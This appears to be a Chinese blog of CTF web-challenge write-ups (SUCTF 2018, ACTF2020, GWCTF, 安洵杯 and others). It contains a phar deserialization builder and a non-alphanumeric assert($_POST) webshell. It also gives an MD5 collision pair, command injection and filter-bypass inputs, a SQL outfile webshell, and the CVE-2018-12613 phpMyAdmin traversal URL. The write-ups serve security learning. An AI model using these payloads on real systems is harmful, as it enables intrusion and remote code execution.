下面这部分是phar 反序列都需要写的, 视情况改动</span></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;expexp.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225234937.png"></p>
+<p>参考资料: </p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.suk1.top/2020/01/16/BuuctfDay7/">https://www.suk1.top/2020/01/16/BuuctfDay7/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kevinbruce656/p/11316070.html">https://www.cnblogs.com/kevinbruce656/p/11316070.html</a></p>
+<h1 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h1><p>题目给出了一些源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($contents = file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>])) &#123; <span class="comment">// 将文件内容以字符串的形式读入变量contents</span></span><br><span class="line">    $data = substr($contents, <span class="number">5</span>); <span class="comment">// 从字符串的第6个位置开始,截取之后的内容赋值给变量data</span></span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123; <span class="comment">// 遍历黑名单并赋值给变量b</span></span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="literal">false</span>) &#123; <span class="comment">// 如果变量data 中存在黑名单中的字段,就上传失败</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我顺便上传了几个文件,都不行,当上传一个没有内容的shell.php时,成功上传</p>
+<p>返回的文件路径是32位的hash,并且固定不变,无论上传什么文件后缀都为<code>.php</code></p>
+<p>当什么都不上传的时候,点击提交 , 就返回<code>Return Code: 4</code>  不知道是不是hint</p>
+<p>对上传的内容进行fuzz(fuzz 字典为键盘上的所有可打印字符). 发现只有<code>[]</code> <code>_</code> <code>()</code> <code>$</code> <code>~</code>可以上传 所以很明显是用<del>和不可显字符写webshell,需要利用php的位运算,来构造代码执行函数 ,其中 $ 使用来声明变量的, 其他是用来定义函数的时候用的,在ISO-8859-15 编码下进行保存,`</del><code> 可用来进行</code>取反<code>操作,进而构造出我们需要的字符看了wp后,发现</code>. ;` 也可以上传,但是为什么我用bp FUZZ的时候就不行呢?导致我以为还要用上面那几个去构造. 和 ;  </p>
+<p>看了一篇文章后,知道了原因: 要把payload encoding 哪里取消掉(不然会因为字符编码无法得到正确的白名单), 然后在 grep match 勾选,这样fuzz 就能快速找到合法的字符了</p>
+<p>还有<code>非英文字符</code> 也可以上传</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228111130.png"></p>
+<p><code>~(X) 当X为一个汉字时对这个汉字取反第二位可以得到得到一个英文字符</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228144952.png"></p>
+<p>还有一个小 <code>trick</code></p>
+<p>在PHP中，如果<strong>强制连接数组和字符串的话，数组将被转换成字符串</strong>，其值为<code>Array</code></p>
+<p>第一个字母是大写A, 第四个字母为小写a, 如果题目允许 <code>+</code> 的话, 可以利用 自增运算符,来获得所有字母</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228144912.png"></p>
+<p>然后构造函数执行即可.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">// 关闭报错,不然出现一堆notice 很烦</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$dic = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$str = <span class="string">&quot;每一次回家,每次都会有不同的感悟,这感悟不光是来自我其他学校的好朋友的一些生活分享,也来自自我的体验.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">就如我的标题所言—-“只不过是有人替我(们)负重前行”,真的很感谢他们,但是有时候有希望自己能做出些事情来改变,希望负重的是我们.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在知乎上看到的,觉得很有道理,这里就直接copy过来吧.文末注明出处</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">你学习一般，考上了现在的这所学校，成绩不算好，拿不到奖学金，上课不听讲，上自习不规律,考试靠突击，同学帮一把的话也能每科考到七八十分，但是与优秀总有很大距离。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">你家境一般，父母都是普通员工，你在这个城市的生活费是每月一千二，没事下下馆子,一个月添件衣服，想买台相机，咬咬牙才能买双自己喜欢的鞋。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">你几乎没有特长，不会弹吉他，不会弹钢琴，不会跳舞，不会画画，想学摄影却不会使用图片处理软件，想上台演出却没信心，学校晚会比赛的时候，你经常是站在台下围观的人群里的一员，你与聚光灯环绕的舞台几乎绝缘。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">你的感情也是一般，有时候会遇见自己心仪的那个人，但是总抓不住机会，眨眼间那个人就被其他人俘获，你就开始伤心、抱怨，但是几天之后又开始寻找新的心上人，就这样看着一个个心上人走过，直到你毕业，与其中任何一个都没有发展。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">总之，你没有什么特别的地方 ，就和周围的千万个普通人一样。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">你不甘心拿不到奖学金，看见别人得奖学金的时候你会说那完全是突击的结果，于是你开始上自习，不过你只坚持了一星期。</span></span><br><span class="line"><span class="string">你不甘心自己的父辈平平，于是你批评讽刺自己周围的“官二代”、“富二代”，立志要努力学习争取成功，也好让自己的孩子成为“富二代”，你的热情持续了一个星期。</span></span><br><span class="line"><span class="string">你不甘心自己什么特长都没有，于是你开始学弹吉他、买滑轮鞋、借来摄影方面的书籍，你对着镜子微笑着说：“你是最棒的。” 这份虚假的信心维持了一个星期。</span></span><br><span class="line"><span class="string">你不甘心自己没有伴侣，你决心洗心革面重新做人，你删掉电脑里的偶像剧肥皂剧，你收拾起床上的懒人桌，把零食袋子统统扔掉，然后洗了个澡并且修饰了一下自己，你往发型上喷了啫喱水，好让自己看起来很精神，你怀揣着一本成功学的书决定出去走走，开始新的生活。这样的状态，你稀稀拉拉地坚持了一个星期。</span></span><br><span class="line"><span class="string">一个星期之后，你还是和周围千万个人一样，你还是和一星期前的自己一样。</span></span><br><span class="line"><span class="string">你逛网络论坛，看到了这样一句话：“二十岁是人生最美好的时光，不应该局限在学校里教室里，应该享受生活。” 于是你相信了，你觉得二十岁的你就应该“随心所欲”，享受“人生中最后的自由时光”；就应该“快乐地去恋爱”“风华正茂”“挥斥方遒”······</span></span><br><span class="line"><span class="string">现在的你，用着父母的血汗钱，用着名牌包、穿着名牌跑鞋、骑着捷安特山地车、用着佳能牌的相机和苹果牌的手机，还经常去星巴克喝喝咖啡体验一下小资情调······</span></span><br><span class="line"><span class="string">那么，请允许我猜测一下你的未来——</span></span><br><span class="line"><span class="string">在大四将要结束时，你考研落榜。你风风火火的参加校园招聘会，很多公司你都看不上，嫌他们不是体制内单位、平台窄、规模小，直到毕业，你还没有找到心仪的工作。你收拾好行李回到老家，父母让你试着参加各种招聘考试或者参加当地的应聘会，你不去，因为你觉得那些工作太简单了，不适合你，你应该去寻找更好的就业机会。可是，当你去那些你看得上的公司应聘时，你的竞争对手太多了，而且都不差，你表现平平，理所当然地被拒之门外······</span></span><br><span class="line"><span class="string">现在的你，也许还在上大学，也许和恋人恩恩爱爱，每天黏在一起，午饭晚饭一起去吃，晚自习后还会一起在操场散步。你们讨论起未来，最后的结论总是：不要想得太多，认真过好现在就好。 不幸运的话，几个月后，你们就分手了，你凄凄惨惨戚戚，反复问自己究竟哪里做错了；幸运的话，你们会一直恋爱到毕业，最终，你绝得自己不够优秀没能力去对方所在的城市读研或者工作，所以你们带着不舍和悔恨分手了。</span></span><br><span class="line"><span class="string">现实很残酷，至此，你信了。</span></span><br><span class="line"><span class="string">现在的你喜欢刷微博，你会全力支持那些你赞同的观点，你会激励否定那些你反对的观点。你爱憎分明，看起来很有正义感。你觉得血气方刚的年轻人就应该敢于说出自己的心声。你可能从来不会去想一个问题：你的观点，来自哪里？其实，它们绝大部分来自网络，它们已经蚕食了你的判断力。</span></span><br><span class="line"><span class="string">现在，我只想问你一个问题：二十岁的你，有什么资本。</span></span><br><span class="line"><span class="string">你只是千千万万人中微不足道的一个人，少了你，地球还是一样会转。</span></span><br><span class="line"><span class="string">我敢打赌，一定很久没人和你说过“吃得苦中苦，方为人上人”这句话了吧？</span></span><br><span class="line"><span class="string">你知道“责任”两个字是怎么写的吗?</span></span><br><span class="line"><span class="string">当你谈论飞翔的时候，你是不是忘记了地心引力的存在？</span></span><br><span class="line"><span class="string">现在的你，如果还是放纵着自己的懒惰与幼稚，虚度着光阴，那么，你就虚度去吧。反正我已经过了二十岁的年纪，我还有未来，我得直奔向前了，不陪你了。</span></span><br><span class="line"><span class="string">再见&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; mb_strlen($str, <span class="string">&#x27;utf-8&#x27;</span>); $i++) &#123;</span><br><span class="line">    $st = mb_substr($str, $i, <span class="number">1</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    $a = ~($st);</span><br><span class="line">    $b = $a[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">#$c = $a[2];</span></span><br><span class="line">    <span class="keyword">foreach</span> ($dic <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($b == $key) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $key . <span class="string">&#x27;  &#x27;</span> . <span class="string">&#x27;:&#x27;</span> . <span class="string">&#x27;   &#x27;</span> . $st;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if($c==$key)</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        <span class="comment">//     echo $key.&#x27;  &#x27;.&#x27;:&#x27;.&#x27;   &#x27;.$st;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>算取可以用的UTF-8的中文字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">每谢次站(POST) 鞋包包的拾捷(assert)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228151226.png"></p>
+<p>当然这道题用<code> ~()[1];</code> 来取字母<code>php &gt; echo ~(鞋)[1]; a</code></p>
+<p>然后就是<code>利用PHP的弱类型</code> 来获取<code>1</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228154746.png"></p>
+<p>然后就是写shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//assert($_POST[_]);</span></span><br><span class="line"><span class="comment">// 用白名单列出所需字母,然后再拼接出函数</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$_ = _ == _; <span class="comment">// 1</span></span><br><span class="line">$__ = ~(鞋)[$_]; <span class="comment">// a</span></span><br><span class="line">$___ = ~(包)[$_]; <span class="comment">// s</span></span><br><span class="line">$____ = ~(的)[$_]; <span class="comment">// e</span></span><br><span class="line">$_____ = ~(捷)[$_]; <span class="comment">// r</span></span><br><span class="line">$______ = ~(拾)[$_]; <span class="comment">// t</span></span><br><span class="line">$_______ = ~(每)[$_]; <span class="comment">// P</span></span><br><span class="line">$________ = ~(谢)[$_]; <span class="comment">// O</span></span><br><span class="line">$_________ = ~(次)[$_]; <span class="comment">// S</span></span><br><span class="line">$__________ = ~(站)[$_]; <span class="comment">//T</span></span><br><span class="line"><span class="comment">// 构造一句话</span></span><br><span class="line">$_ = $__ . $___ . $___ . $____ . $_____ . $______; <span class="comment">// assert</span></span><br><span class="line">$__ = _ . $_______ . $________ . $_________ . $__________; <span class="comment">// _POST</span></span><br><span class="line">$__= $$__;  <span class="comment">// $_POST</span></span><br><span class="line">$_($__[_]);  <span class="comment">// assert($_POST[_]</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>使用时,将所有注释删除,并且不要留任何空格!</strong></p>
+<p>上传成功后,flag就在phpinfo里面…..</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line">$_=_==_;</span><br><span class="line">$__=~(鞋)[$_];</span><br><span class="line">$___=~(包)[$_];</span><br><span class="line">$____=~(的)[$_];</span><br><span class="line">$_____=~(捷)[$_];</span><br><span class="line">$______=~(拾)[$_];</span><br><span class="line">$_______=~(每)[$_];</span><br><span class="line">$________=~(谢)[$_];</span><br><span class="line">$_________=~(次)[$_];</span><br><span class="line">$__________=~(站)[$_];</span><br><span class="line">$_=$__.$___.$___.$____.$_____.$______;</span><br><span class="line">$__=_.$_______.$________.$_________.$__________;</span><br><span class="line">$__=$$__;</span><br><span class="line">$_($__[_]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228165052.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228165125.png"></p>
+<p>参考资料: <a target="_blank" rel="noopener" href="https://www.xctf.org.cn/library/details/2ff21f569a791e21cbd6ce0d4675a9de5ec2373a/">https://www.xctf.org.cn/library/details/2ff21f569a791e21cbd6ce0d4675a9de5ec2373a/</a></p>
+<p>p 🐮 : <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<h1 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous#"></a>[SUCTF 2018]annonymous#</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&quot;die(`cat flag.php`);&quot;</span>); <span class="comment">// 如果执行了MY 函数,那么就能 cat flag.php(因为是反引号)</span></span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>)); <span class="comment">// 把包含数据的二进制字符串转换为十六进制值;生成一个长度为32的伪随机字节串</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_$hash()&#123;&quot;</span> <span class="comment">// 函数名称为 SUCTF_32HASH值</span></span><br><span class="line">    . <span class="string">&quot;global \$MY;&quot;</span> <span class="comment">// 定义为全局变量</span></span><br><span class="line">    . <span class="string">&quot;\$MY();&quot;</span> <span class="comment">// 调用新的匿名函数</span></span><br><span class="line">    . <span class="string">&quot;&#125;&quot;</span>); <span class="comment">// eval(php_code);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;func_name&#x27;</span>])) &#123;</span><br><span class="line">    $_GET[<span class="string">&quot;func_name&quot;</span>](); <span class="comment">// 执行func_name 函数 ,  构造 func_name 为匿名函数就可以拿到flag ;</span></span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//function SUCTF_$hash()&#123;&quot;.&quot;global \$MY;&quot;.&quot;\$MY();&quot; . &quot;&#125;&quot;&#125;;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$MY = create_function(<span class="string">&quot;&quot;</span>, <span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line">var_dump($MY);</span><br><span class="line"><span class="comment">// string(9) &quot; lambda_1&quot;  后面这个数字看了WP说是随机的</span></span><br></pre></td></tr></table></figure>
+
+<p>那么思路就是爆破这个数字,就可以拿到flag</p>
+<p><code># 表示未研究透彻 , 后期补充</code></p>
+<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web#"></a>[安洵杯 2019]easy_web#</h1><p>对<code>img</code>的参数进行两次base64decode 和一次hexdecode 即可得到<code>555.png</code> 用相反的方法对index.php进行编码得到 <code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code> 得到php源码</p>
+<p>在进行RCE 之前需要 绕过</p>
+<p><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code> </p>
+<p>三个等号的md5<code>强相等</code> 用下面这个就好了,然后就可以 执行cmd里的命令了(因为是反引号`)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+
+<p>然后就是这段正则表达式: </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|<span class="keyword">echo</span>|sh|\<span class="string">&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i</span></span><br></pre></td></tr></table></figure>
+
+<p>没有过滤\ , 直接 <code>ca\t /fl\ag</code> 即可.</p>
+<p><code># 表示未研究透彻 , 后期补充</code></p>
+<h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>很简单的文件上传题,这里我fuzz 后缀的时候,除了 <code>.php</code> <code>.php2</code> 的文件不能上传外,以及用<code>.</code>来绕过的会把php替换为空,其他的都能上传,但是不能解析,蚁剑连不上.最后用<code>.phtml</code> 连上了</p>
+<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p><code>/?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
+<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>没有任何过滤的 command injection</p>
+<p><code>127.0.0.1;cat /flag</code></p>
+<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><ul>
+<li>备份文件</li>
+<li>弱类型</li>
+</ul>
+<p><code>/index.php.bak</code> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;&#x3D;&#x3D;123);</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>
+
+<p><code>key=123</code></p>
+<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>除了题目数据库这两个字,找不到任何提示,扫描目录: <code>robots.txt</code> <code>phpinfo.php</code>  <code>phpmyadmin/</code> 一开始我的思路是: 在里面写一个一句话然后拿shell 在文件目录里面拿flag</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[aaa]);?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是没有权限 <code>#1045 - Access denied for user &#39;test&#39;@&#39;%&#39; (using password: YES)</code> </p>
+<p> 查看phpmyadmin 的版本为<code> 4.8.1</code> 去搜一波漏洞 可以搜到 <strong>CVE-2018-12613</strong></p>
+<p>可以直接利用这个拿flag</p>
+<p><code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</code> </p>
+<p>还可以利用下面这篇文章的思路来getshell</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9897436.html">https://www.cnblogs.com/bmjoker/p/9897436.html</a></p>
+<p>在SQL 中执行一个 phpinfo用于测试,或者写一个一句话连shell, 然后查看cookie(sessionid) <code>666d1r51ecqgj304aficsoijuv</code> , session 文件是存放在<code>/tmp/sess_sessionid</code> 这个文件下的</p>
+<p><code>phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_666d1r51ecqgj304aficsoijuv</code></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">学习</a></p>
+<p><code>%253f</code> 是 <code>?</code> 经过两次URL编码的结果.从而来绕过白名单检测(465行的 urldecode()),具体原理 参考学习</p>
+<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>没有任何提示, 只知道是和MD5有关的,抓包后发现了hint :</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: <span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="keyword">md5</span>($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这道题和 <a href="https://hack-for.fun/posts/20200103/#toc-heading-4">https://hack-for.fun/posts/20200103/#toc-heading-4</a> 是一样的,直接来了</p>
